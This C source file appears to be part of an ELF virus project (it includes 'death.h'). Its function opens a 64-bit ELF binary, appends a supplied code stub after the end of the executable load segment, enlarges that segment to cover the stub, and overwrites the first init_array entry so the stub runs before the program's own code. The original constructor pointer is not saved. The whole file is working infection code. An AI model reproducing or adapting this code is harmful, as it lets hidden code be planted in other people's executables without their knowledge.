#include "../include/death.h"


int patch_init_array64(int fd, unsigned char *g_stub_code, size_t g_stub_size)
{
	Elf64_Ehdr eh;
	Elf64_Phdr ph;
	lseek(fd, 0, SEEK_SET);
	read(fd, &eh, sizeof(eh));
	Elf64_Off  phoff = eh.e_phoff;
	Elf64_Half phnum = eh.e_phnum;
	Elf64_Phdr dyn_ph;
	int dyn_found = 0;
	for (int i = 0; i < phnum; i++) 
	{
		lseek(fd, phoff + i * sizeof(ph), SEEK_SET);
		read(fd, &ph, sizeof(ph));
		if (ph.p_type == PT_DYNAMIC) 
		{
			dyn_ph = ph;
			dyn_found = 1;
			break;
		}
	}
	if (!dyn_found)
		return 0;
	Elf64_Dyn dyn;
	uint64_t init_array_vaddr = 0;
	uint64_t init_array_sz    = 0;
	for (off_t off = dyn_ph.p_offset;
		 off < (off_t)(dyn_ph.p_offset + dyn_ph.p_filesz);
		 off += sizeof(dyn))
	{
		lseek(fd, off, SEEK_SET);
		read(fd, &dyn, sizeof(dyn));
		if (dyn.d_tag == DT_NULL)
			break;
		if (dyn.d_tag == DT_INIT_ARRAY)
			init_array_vaddr = dyn.d_un.d_ptr;
		else if (dyn.d_tag == DT_INIT_ARRAYSZ)
			init_array_sz = dyn.d_un.d_val;
	}
	if (!init_array_vaddr || init_array_sz < sizeof(uint64_t))
		return 0;
	Elf64_Phdr code_ph;
	int code_index = -1;
	for (int i = 0; i < phnum; i++)
	{
		lseek(fd, phoff + i * sizeof(ph), SEEK_SET);
		read(fd, &ph, sizeof(ph));
		if (ph.p_type == PT_LOAD && (ph.p_flags & PF_X)) 
		{
			Elf64_Addr start = ph.p_vaddr;
			Elf64_Addr end   = ph.p_vaddr + ph.p_memsz;
			if (eh.e_entry >= start && eh.e_entry < end)
			{
				code_ph = ph;
				code_index = i;
				break;
			}
		}
	}
	if (code_index < 0)
		return 0;
	const off_t align = 0x10;
	off_t end = code_ph.p_offset + code_ph.p_filesz;
	off_t stub_off = (end + (align - 1)) & ~(align - 1);
	lseek(fd, stub_off, SEEK_SET);
	write(fd, g_stub_code, g_stub_size);
	Elf64_Phdr current;
	lseek(fd, phoff + code_index * sizeof(current), SEEK_SET);
	read(fd, &current, sizeof(current));
	current.p_filesz = (stub_off + g_stub_size) - current.p_offset;
	current.p_memsz  = current.p_filesz;
	lseek(fd, phoff + code_index * sizeof(current), SEEK_SET);
	write(fd, &current, sizeof(current));
	uint64_t stub_vaddr = current.p_vaddr + (stub_off - current.p_offset);
	off_t init_array_off = vaddr_to_file_offset(fd, init_array_vaddr);
	if (init_array_off < 0)
		return 0;
	lseek(fd, init_array_off, SEEK_SET);
	write(fd, &stub_vaddr, sizeof(stub_vaddr));
	return (1);
}


int	patch_init_array(int fd, unsigned char *g_stub_code, size_t g_stub_size)
{
	ElfClass elf = detect_class(fd);
	if (elf.is64)
		return patch_init_array64(fd, g_stub_code, g_stub_size);
	return 0;
}
